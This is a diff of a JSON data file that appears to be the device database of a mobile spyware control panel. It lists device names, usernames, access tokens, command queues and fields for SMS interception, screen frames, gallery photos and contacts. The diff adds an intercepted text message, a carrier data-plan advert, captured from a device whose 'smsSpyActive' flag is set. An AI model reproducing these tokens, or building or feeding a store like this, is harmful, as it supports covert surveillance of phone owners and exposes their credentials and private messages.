@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776767224334,
+    "lastSeen": 1776767227025,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -8202,7 +8202,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776767225136,
+    "lastSeen": 1776767227559,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -8217,7 +8217,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "SMS",
+        "sender": "3Kejutan",
+        "content": "YAKIN DI SKIP KUOTA SEHEMAT INI?\n- 8GB 2hr 10rb\n- 16GB 28hr 50rb\nBeli di http://bima-3.co/cvmwa Sekarang!",
+        "time": "21/04 17:27",
+        "pkg": "com.android.mms",
+        "receivedAt": 1776767229264
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
